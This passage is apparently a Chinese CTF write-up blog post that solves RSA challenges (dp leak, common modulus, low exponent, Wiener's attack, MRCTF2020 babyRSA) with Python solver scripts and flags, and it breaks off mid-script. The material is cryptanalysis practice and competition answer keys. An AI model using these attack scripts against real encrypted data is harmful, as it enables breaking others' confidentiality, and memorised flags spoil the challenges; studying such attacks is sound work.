<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes

e <span class="token operator">=</span> <span class="token number">65537</span>
n <span class="token operator">=</span> <span class="token number">156808343598578774957375696815188980682166740609302831099696492068246337198792510898818496239166339015207305102101431634283168544492984586566799996471150252382144148257236707247267506165670877506370253127695314163987084076462560095456635833650720606337852199362362120808707925913897956527780930423574343287847</span>
c <span class="token operator">=</span> <span class="token number">108542078809057774666748066235473292495343753790443966020636060807418393737258696352569345621488958094856305865603100885838672591764072157183336139243588435583104423268921439473113244493821692560960443688048994557463526099985303667243623711454841573922233051289561865599722004107134302070301237345400354257869</span>
dp <span class="token operator">=</span> <span class="token number">734763139918837027274765680404546851353356952885439663987181004382601658386317353877499122276686150509151221546249750373865024485652349719427182780275825</span>


<span class="token keyword">def</span> <span class="token function">getd</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> e<span class="token punctuation">,</span> dp<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>dp <span class="token operator">*</span> e <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            x <span class="token operator">=</span> <span class="token punctuation">(</span>dp <span class="token operator">*</span> e <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">//</span> i <span class="token operator">+</span> <span class="token number">1</span>
            y <span class="token operator">=</span> n <span class="token operator">%</span> x
            <span class="token keyword">if</span> y <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
                p <span class="token operator">=</span> x
                <span class="token keyword">break</span>
    q <span class="token operator">=</span> n <span class="token operator">//</span> p
    phi <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
    d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span> <span class="token operator">%</span> phi
    <span class="token keyword">return</span> d


d <span class="token operator">=</span> getd<span class="token punctuation">(</span>n<span class="token punctuation">,</span> e<span class="token punctuation">,</span> dp<span class="token punctuation">)</span>
m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
flag <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
<span class="token comment"># b'wctf2020&#123;dp_leaking_1s_very_d@angerous&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="共模攻击"><a href="#共模攻击" class="headerlink" title="共模攻击"></a>共模攻击</h3><h4 id="ctfshow、easyrsa3"><a href="#ctfshow、easyrsa3" class="headerlink" title="ctfshow、easyrsa3"></a>ctfshow、easyrsa3</h4><p><strong>TAG: 共模攻击</strong></p>
<p>给出数据</p>
<pre class="line-numbers language-none"><code class="language-none">e &#x3D; 797
n &#x3D; 15944475431088053285580229796309956066521520107276817969079550919586650535459242543036143360865780730044733026945488511390818947440767542658956272380389388112372084760689777141392370253850735307578445988289714647332867935525010482197724228457592150184979819463711753058569520651205113690397003146105972408452854948512223702957303406577348717348753106868356995616116867724764276234391678899662774272419841876652126127684683752880568407605083606688884120054963974930757275913447908185712204577194274834368323239143008887554264746068337709465319106886618643849961551092377843184067217615903229068010117272834602469293571
c &#x3D; 11157593264920825445770016357141996124368529899750745256684450189070288181107423044846165593218013465053839661401595417236657920874113839974471883493099846397002721270590059414981101686668721548330630468951353910564696445509556956955232059386625725883038103399028010566732074011325543650672982884236951904410141077728929261477083689095161596979213961494716637502980358298944316636829309169794324394742285175377601826473276006795072518510850734941703194417926566446980262512429590253643561098275852970461913026108090608491507300365391639081555316166526932233787566053827355349022396563769697278239577184503627244170930

e &#x3D; 521
n &#x3D; 15944475431088053285580229796309956066521520107276817969079550919586650535459242543036143360865780730044733026945488511390818947440767542658956272380389388112372084760689777141392370253850735307578445988289714647332867935525010482197724228457592150184979819463711753058569520651205113690397003146105972408452854948512223702957303406577348717348753106868356995616116867724764276234391678899662774272419841876652126127684683752880568407605083606688884120054963974930757275913447908185712204577194274834368323239143008887554264746068337709465319106886618643849961551092377843184067217615903229068010117272834602469293571
c &#x3D; 6699274351853330023117840396450375948797682409595670560999898826038378040157859939888021861338431350172193961054314487476965030228381372659733197551597730394275360811462401853988404006922710039053586471244376282019487691307865741621991977539073601368892834227191286663809236586729196876277005838495318639365575638989137572792843310915220039476722684554553337116930323671829220528562573169295901496437858327730504992799753724465760161805820723578087668737581704682158991028502143744445435775458296907671407184921683317371216729214056381292474141668027801600327187443375858394577015394108813273774641427184411887546849<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>n相同，判定所需的攻击方式为共模攻击</p>
<p>用我特制的脚本拿到了flag</p>
<pre class="line-numbers language-none"><code class="language-none">flag&#123;sh4r3_N&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="低加密指数攻击"><a href="#低加密指数攻击" class="headerlink" title="低加密指数攻击"></a>低加密指数攻击</h3><h4 id="ctfshow、easyrsa4"><a href="#ctfshow、easyrsa4" class="headerlink" title="ctfshow、easyrsa4"></a>ctfshow、easyrsa4</h4><p>给出数据为</p>
<pre class="line-numbers language-none"><code class="language-none">e &#x3D; 3
n &#x3D; 18970053728616609366458286067731288749022264959158403758357985915393383117963693827568809925770679353765624810804904382278845526498981422346319417938434861558291366738542079165169736232558687821709937346503480756281489775859439254614472425017554051177725143068122185961552670646275229009531528678548251873421076691650827507829859299300272683223959267661288601619845954466365134077547699819734465321345758416957265682175864227273506250707311775797983409090702086309946790711995796789417222274776215167450093735639202974148778183667502150202265175471213833685988445568819612085268917780718945472573765365588163945754761
c &#x3D; 150409620528139732054476072280993764527079006992643377862720337847060335153837950368208902491767027770946661<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>符合低加密指数攻击的一般特性，加密指数指的就是加密过程中所使用的参数<em>e</em>，低加密指数说的就是这个参数很小的时候(一般等于2或3)，可以直接对这个加密后的内容c进行开方来解密。写脚本如下</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes

e <span class="token operator">=</span> <span class="token number">3</span>
n <span class="token operator">=</span> <span class="token number">18970053728616609366458286067731288749022264959158403758357985915393383117963693827568809925770679353765624810804904382278845526498981422346319417938434861558291366738542079165169736232558687821709937346503480756281489775859439254614472425017554051177725143068122185961552670646275229009531528678548251873421076691650827507829859299300272683223959267661288601619845954466365134077547699819734465321345758416957265682175864227273506250707311775797983409090702086309946790711995796789417222274776215167450093735639202974148778183667502150202265175471213833685988445568819612085268917780718945472573765365588163945754761</span>
c <span class="token operator">=</span> <span class="token number">150409620528139732054476072280993764527079006992643377862720337847060335153837950368208902491767027770946661</span>

tmp <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>c<span class="token punctuation">,</span> e<span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 防止c已经被模n过了</span>
    <span class="token keyword">if</span> tmp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        m <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>tmp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">break</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        c <span class="token operator">+=</span> n
flag <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="e很大时-Winner’s-attack"><a href="#e很大时-Winner’s-attack" class="headerlink" title="e很大时(Winner’s attack)"></a>e很大时(Winner’s attack)</h3><h4 id="ctfshow、easyrsa5"><a href="#ctfshow、easyrsa5" class="headerlink" title="ctfshow、easyrsa5"></a>ctfshow、easyrsa5</h4><p>当e很大、d很小时采用winner’s attack攻击。先看看给出的数据</p>
<pre class="line-numbers language-none"><code class="language-none">e &#x3D; 284100478693161642327695712452505468891794410301906465434604643365855064101922252698327584524956955373553355814138784402605517536436009073372339264422522610010012877243630454889127160056358637599704871937659443985644871453345576728414422489075791739731547285138648307770775155312545928721094602949588237119345
n &#x3D; 468459887279781789188886188573017406548524570309663876064881031936564733341508945283407498306248145591559137207097347130203582813352382018491852922849186827279111555223982032271701972642438224730082216672110316142528108239708171781850491578433309964093293907697072741538649347894863899103340030347858867705231
c &#x3D; 350429162418561525458539070186062788413426454598897326594935655762503536409897624028778814302849485850451243934994919418665502401195173255808119461832488053305530748068788500746791135053620550583421369214031040191188956888321397450005528879987036183922578645840167009612661903399312419253694928377398939392827<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>三个参数很接近的时候，采用维纳攻击，我对维纳攻击的脚本编写的原理不是特别清楚，这里我只是一个脚本小子，直接<code>pip3 install owiener</code>下载维纳攻击的工具即可，编写脚本</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes
<span class="token keyword">import</span> owiener

e <span class="token operator">=</span> <span class="token number">284100478693161642327695712452505468891794410301906465434604643365855064101922252698327584524956955373553355814138784402605517536436009073372339264422522610010012877243630454889127160056358637599704871937659443985644871453345576728414422489075791739731547285138648307770775155312545928721094602949588237119345</span>
n <span class="token operator">=</span> <span class="token number">468459887279781789188886188573017406548524570309663876064881031936564733341508945283407498306248145591559137207097347130203582813352382018491852922849186827279111555223982032271701972642438224730082216672110316142528108239708171781850491578433309964093293907697072741538649347894863899103340030347858867705231</span>
c <span class="token operator">=</span> <span class="token number">350429162418561525458539070186062788413426454598897326594935655762503536409897624028778814302849485850451243934994919418665502401195173255808119461832488053305530748068788500746791135053620550583421369214031040191188956888321397450005528879987036183922578645840167009612661903399312419253694928377398939392827</span>

d <span class="token operator">=</span> owiener<span class="token punctuation">.</span>attack<span class="token punctuation">(</span>e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
flag <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
<span class="token comment"># flag&#123;very_biiiiig_e&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="已知p高位攻击"><a href="#已知p高位攻击" class="headerlink" title="已知p高位攻击"></a>已知p高位攻击</h3><h4 id="ctfshow、easyrsa7"><a href="#ctfshow、easyrsa7" class="headerlink" title="ctfshow、easyrsa7"></a>ctfshow、easyrsa7</h4><p>给出的条件为</p>
<pre class="line-numbers language-none"><code class="language-none">e &#x3D; 0x10001
p&gt;&gt;128&lt;&lt;128 &#x3D; 0xd1c520d9798f811e87f4ff406941958bab8fc24b19a32c3ad89b0b73258ed3541e9ca696fd98ce15255264c39ae8c6e8db5ee89993fa44459410d30a0a8af700ae3aee8a9a1d6094f8c757d3b79a8d1147e85be34fb260a970a52826c0a92b46cefb5dfaf2b5a31edf867f8d34d2222900000000000000000000000000000000
n &#x3D; 0x79e0bf9b916e59286163a1006f8cefd4c1b080387a6ddb98a3f3984569a4ebb48b22ac36dff7c98e4ebb90ffdd9c07f53a20946f57634fb01f4489fcfc8e402865e152820f3e2989d4f0b5ef1fb366f212e238881ea1da017f754d7840fc38236edba144674464b661d36cdaf52d1e5e7c3c21770c5461a7c1bc2db712a61d992ebc407738fc095cd8b6b64e7e532187b11bf78a8d3ddf52da6f6a67c7e88bef5563cac1e5ce115f3282d5ff9db02278859f63049d1b934d918f46353fea1651d96b2ddd874ec8f1e4b9d487d8849896d1c21fb64029f0d6f47e560555b009b96bfd558228929a6cdf3fb6d47a956829fb1e638fcc1bdfad4ec2c3590dea1ed3
c &#x3D; 0x1b2b4f9afed5fb5f9876757e959c183c2381ca73514b1918d2f123e386bebe9832835350f17ac439ac570c9b2738f924ef49afea02922981fad702012d69ea3a3c7d1fc8efc80e541ca2622d7741090b9ccd590906ac273ffcc66a7b8c0d48b7d62d6cd6dd4cd75747c55aac28f8be3249eb255d8750482ebf492692121ab4b27b275a0f69b15baef20bf812f3cbf581786128b51694331be76f80d6fb1314d8b280eaa16c767821b9c2ba05dfde5451feef22ac3cb3dfbc88bc1501765506f0c05045184292a75c475486b680f726f44ef8ddfe3c48f75bb03c8d44198ac70e6b7c885f53000654db22c8cee8eb4f65eaeea2da13887aaf53d8c254d2945691<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>给出了p的高位，这时候可以利用Coppersmith攻击来恢复p，这个我现在也不是特别了解原理，明天再看看。</p>
<h3 id="复杂的RSA"><a href="#复杂的RSA" class="headerlink" title="复杂的RSA"></a>复杂的RSA</h3><blockquote>
<p>​    这里把下面的所有的RSA的题目全部归类为复杂的rsa题目，既能归为复杂，必然是用到的不仅仅是rsa的知识，或者就是有多重加密的嵌套，但是起主要作用的还是rsa亦可归为此类之中。</p>
<p>​    现在的比赛的题目大多数都是这种了，就是给你一个用来加密的脚本，让你自己找加密中的脆弱的地方，从而实现破解。</p>
</blockquote>
<h4 id="MRCTF2020-babyRSA"><a href="#MRCTF2020-babyRSA" class="headerlink" title="[MRCTF2020]babyRSA"></a>[MRCTF2020]babyRSA</h4><p>给出的加密的脚本为</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sympy
<span class="token keyword">import</span> random
<span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> gcd<span class="token punctuation">,</span> invert
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> getPrime<span class="token punctuation">,</span> isPrime<span class="token punctuation">,</span> getRandomNBitInteger<span class="token punctuation">,</span> bytes_to_long<span class="token punctuation">,</span> long_to_bytes
<span class="token keyword">from</span> z3 <span class="token keyword">import</span> <span class="token operator">*</span>
flag <span class="token operator">=</span> <span class="token string">b"MRCTF&#123;xxxx&#125;"</span>
base <span class="token operator">=</span> <span class="token number">65537</span>


<span class="token keyword">def</span> <span class="token function">GCD</span><span class="token punctuation">(</span>A<span class="token punctuation">)</span><span class="token punctuation">:</span>
    B <span class="token operator">=</span> <span class="token number">1</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>A<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        B <span class="token operator">=</span> gcd<span class="token punctuation">(</span>A<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> A<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> B


<span class="token keyword">def</span> <span class="token function">gen_p</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    P <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    P<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        P<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> sympy<span class="token punctuation">.</span>nextprime<span class="token punctuation">(</span>P<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"P_p :"</span><span class="token punctuation">,</span> P<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    n <span class="token operator">=</span> <span class="token number">1</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        n <span class="token operator">*=</span> P<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
    p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    factor <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> base<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"P_factor :"</span><span class="token punctuation">,</span> factor<span class="token punctuation">)</span>
    <span class="token keyword">return</span> sympy<span class="token punctuation">.</span>nextprime<span class="token punctuation">(</span>p<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">gen_q</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sub_Q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    Q_1 <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    Q_2 <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    Q <span class="token operator">=</span> sub_Q <span class="token operator">**</span> Q_2 <span class="token operator">%</span> Q_1
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Q_1: "</span><span class="token punctuation">,</span> Q_1<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Q_2: "</span><span class="token punctuation">,</span> Q_2<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"sub_Q: "</span><span class="token punctuation">,</span> sub_Q<span class="token punctuation">)</span>
    <span class="token keyword">return</span> sympy<span class="token punctuation">.</span>nextprime<span class="token punctuation">(</span>Q<span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    _E <span class="token operator">=</span> base
    _P <span class="token operator">=</span> gen_p<span class="token punctuation">(</span><span class="token punctuation">)</span>
    _Q <span class="token operator">=</span> gen_q<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">assert</span> <span class="token punctuation">(</span>gcd<span class="token punctuation">(</span>_E<span class="token punctuation">,</span> <span class="token punctuation">(</span>_P <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>_Q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>
    _M <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
    _C <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>_M<span class="token punctuation">,</span> _E<span class="token punctuation">,</span> _P <span class="token operator">*</span> _Q<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Ciphertext = "</span><span class="token punctuation">,</span> _C<span class="token punctuation">)</span>
<span class="token triple-quoted-string string">'''
P_p : 206027926847308612719677572554991143421
P_factor : 213671742765908980787116579976289600595864704574134469173111790965233629909513884704158446946409910475727584342641848597858942209151114627306286393390259700239698869487469080881267182803062488043469138252786381822646126962323295676431679988602406971858136496624861228526070581338082202663895710929460596143281673761666804565161435963957655012011051936180536581488499059517946308650135300428672486819645279969693519039407892941672784362868653243632727928279698588177694171797254644864554162848696210763681197279758130811723700154618280764123396312330032986093579531909363210692564988076206283296967165522152288770019720928264542910922693728918198338839
Q_1:  103766439849465588084625049495793857634556517064563488433148224524638105971161051763127718438062862548184814747601299494052813662851459740127499557785398714481909461631996020048315790167967699932967974484481209879664173009585231469785141628982021847883945871201430155071257803163523612863113967495969578605521
Q_2:  151010734276916939790591461278981486442548035032350797306496105136358723586953123484087860176438629843688462671681777513652947555325607414858514566053513243083627810686084890261120641161987614435114887565491866120507844566210561620503961205851409386041194326728437073995372322433035153519757017396063066469743
sub_Q:  168992529793593315757895995101430241994953638330919314800130536809801824971112039572562389449584350643924391984800978193707795909956472992631004290479273525116959461856227262232600089176950810729475058260332177626961286009876630340945093629959302803189668904123890991069113826241497783666995751391361028949651
Ciphertext =  1709187240516367141460862187749451047644094885791761673574674330840842792189795049968394122216854491757922647656430908587059997070488674220330847871811836724541907666983042376216411561826640060734307013458794925025684062804589439843027290282034999617915124231838524593607080377300985152179828199569474241678651559771763395596697140206072537688129790126472053987391538280007082203006348029125729650207661362371936196789562658458778312533505938858959644541233578654340925901963957980047639114170033936570060250438906130591377904182111622236567507022711176457301476543461600524993045300728432815672077399879668276471832
'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>​    注意到上面的加密过程给出的q相关的数据比较多，解q也比较简单，直接求一下<code>Q = sub_Q ** Q_2 % Q_1</code>然后求一下<code>sympy.nextprime(Q)</code>即可。</p>
<p>​    再看p，p是直接<code>p = getPrime(1024)</code>获取的，但是给出了加密后的m<code>factor = pow(p, base, n)</code>，只要求出来n与d即可，前面给出的<code>P_p</code>提示即可求出来所有的元素，从而可以获得p。</p>
<p>​    编写解密脚本如下</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sympy
<span class="token keyword">import</span> gmpy2
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes

base <span class="token operator">=</span> <span class="token number">65537</span>
P_p <span class="token operator">=</span> <span class="token number">206027926847308612719677572554991143421</span>
P_factor <span class="token operator">=</span> <span class="token number">213671742765908980787116579976289600595864704574134469173111790965233629909513884704158446946409910475727584342641848597858942209151114627306286393390259700239698869487469080881267182803062488043469138252786381822646126962323295676431679988602406971858136496624861228526070581338082202663895710929460596143281673761666804565161435963957655012011051936180536581488499059517946308650135300428672486819645279969693519039407892941672784362868653243632727928279698588177694171797254644864554162848696210763681197279758130811723700154618280764123396312330032986093579531909363210692564988076206283296967165522152288770019720928264542910922693728918198338839</span>
Q_1 <span class="token operator">=</span> <span class="token number">103766439849465588084625049495793857634556517064563488433148224524638105971161051763127718438062862548184814747601299494052813662851459740127499557785398714481909461631996020048315790167967699932967974484481209879664173009585231469785141628982021847883945871201430155071257803163523612863113967495969578605521</span>
Q_2 <span class="token operator">=</span> <span class="token number">151010734276916939790591461278981486442548035032350797306496105136358723586953123484087860176438629843688462671681777513652947555325607414858514566053513243083627810686084890261120641161987614435114887565491866120507844566210561620503961205851409386041194326728437073995372322433035153519757017396063066469743</span>
sub_Q <span class="token operator">=</span> <span class="token number">168992529793593315757895995101430241994953638330919314800130536809801824971112039572562389449584350643924391984800978193707795909956472992631004290479273525116959461856227262232600089176950810729475058260332177626961286009876630340945093629959302803189668904123890991069113826241497783666995751391361028949651</span>
Ciphertext <span class="token operator">=</span>  <span class="token number">1709187240516367141460862187749451047644094885791761673574674330840842792189795049968394122216854491757922647656430908587059997070488674220330847871811836724541907666983042376216411561826640060734307013458794925025684062804589439843027290282034999617915124231838524593607080377300985152179828199569474241678651559771763395596697140206072537688129790126472053987391538280007082203006348029125729650207661362371936196789562658458778312533505938858959644541233578654340925901963957980047639114170033936570060250438906130591377904182111622236567507022711176457301476543461600524993045300728432815672077399879668276471832</span>

<span class="token comment"># 求q</span>
Q <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>sub_Q<span class="token punctuation">,</span> Q_2<span class="token punctuation">,</span> Q_1<span class="token punctuation">)</span> <span class="token comment"># sub_Q ** Q_2 % Q_1</span>
q <span class="token operator">=</span> sympy<span class="token punctuation">.</span>nextprime<span class="token punctuation">(</span>Q<span class="token punctuation">)</span>

<span class="token comment"># 求p</span>
P <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
P<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> P_p
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    P<span class="token punctuation">[</span><span class="token number">8</span> <span class="token operator">-</span> i<span class="token punctuation">]</span> <span class="token operator">=</span> sympy<span class="token punctuation">.</span>prevprime<span class="token punctuation">(</span>P<span class="token punctuation">[</span><span class="token number">9</span> <span class="token operator">-</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># prevprime是求当前素数的前面一个素数的函数</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    P<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> sympy<span class="token punctuation">.</span>nextprime<span class="token punctuation">(</span>P<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

_n <span class="token operator">=</span> <span class="token number">1</span>
_phi <span class="token operator">=</span> <span class="token number">1</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    _n <span class="token operator">*=</span> P<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
    _phi <span class="token operator">*=</span> <span class="token punctuation">(</span>P<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
_d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>base<span class="token punctuation">,</span> _phi<span class="token punctuation">)</span>
p <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>P_factor<span class="token punctuation">,</span> _d<span class="token punctuation">,</span> _n<span class="token punctuation">)</span>
p <span class="token operator">=</span> sympy<span class="token punctuation">.</span>nextprime<span class="token punctuation">(</span>p<span class="token punctuation">)</span>

<span class="token comment"># 解密</span>
n <span class="token operator">=</span> p <span class="token operator">*</span> q
phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>base<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>
